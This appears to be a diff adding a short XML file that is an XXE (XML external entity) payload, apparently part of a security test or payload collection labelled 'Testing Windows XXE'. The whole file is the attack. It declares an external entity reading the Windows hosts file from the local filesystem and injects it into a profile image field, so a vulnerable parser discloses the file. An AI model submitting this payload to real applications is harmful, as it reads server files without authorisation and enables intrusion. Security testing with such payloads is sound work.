@@ -1,0 +1,8 @@
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY read SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+]>
+<profile>
+    <profile_image>&read;</profile_image>
+    <about>Testing Windows XXE</about>
+</profile>
